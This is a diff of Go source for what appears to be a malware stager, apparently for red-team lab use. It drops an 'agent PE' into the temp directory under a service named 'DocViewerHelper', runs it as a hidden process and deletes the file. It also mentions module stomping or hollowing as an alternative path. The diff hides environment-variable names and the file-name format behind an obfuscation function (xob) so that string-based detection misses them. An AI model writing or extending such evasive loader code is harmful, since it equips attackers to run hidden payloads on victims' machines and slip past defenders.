@@ -37,27 +37,25 @@ var (
 // stageMode selects the staged execution path: "file" (drop→run→delete,
 // default) or "stomp" (module stomping / hollowing — Go-hostile, lab A/B).
 func stageMode() string {
-	if v := os.Getenv("STAGE_MODE"); v != "" && !strings.HasPrefix(v, "{{") {
+	if v := os.Getenv(xob(eEnvStageMode)); v != "" && !strings.HasPrefix(v, "{{") {
 		return strings.ToLower(v)
 	}
-	p := "{{STAGE_MODE}}"
-	if strings.HasPrefix(p, "{{") || p == "" {
-		return "file"
+	if v := bakedStageMode(); v != "" && !strings.HasPrefix(v, "{{") {
+		return strings.ToLower(v)
 	}
-	return strings.ToLower(p)
+	return "file"
 }
 
 // dropDir returns where the agent PE is dropped before launch. Defaults to the
 // system temp dir (C:\Windows\Temp under the DocViewerHelper service).
 func dropDir() string {
-	if v := os.Getenv("STAGE_DROP_DIR"); v != "" && !strings.HasPrefix(v, "{{") {
+	if v := os.Getenv(xob(eEnvDropDir)); v != "" && !strings.HasPrefix(v, "{{") {
 		return v
 	}
-	p := "{{STAGE_DROP_DIR}}"
-	if strings.HasPrefix(p, "{{") || p == "" {
-		return os.TempDir()
+	if v := bakedDropDir(); v != "" && !strings.HasPrefix(v, "{{") {
+		return v
 	}
-	return p
+	return os.TempDir()
 }
 
 // spawnProcess starts path as a hidden child process (not suspended).
@@ -117,7 +115,7 @@ func deleteFileSelf(path string) error {
 func randTempName() string {
 	b := make([]byte, 6)
 	if _, err := rand.Read(b); err != nil {
-		return fmt.Sprintf("dv%d.tmp", time.Now().UnixNano())
+		return fmt.Sprintf(xob(eDropFmt), time.Now().UnixNano())
 	}
 	return hex.EncodeToString(b) + ".tmp"
 }
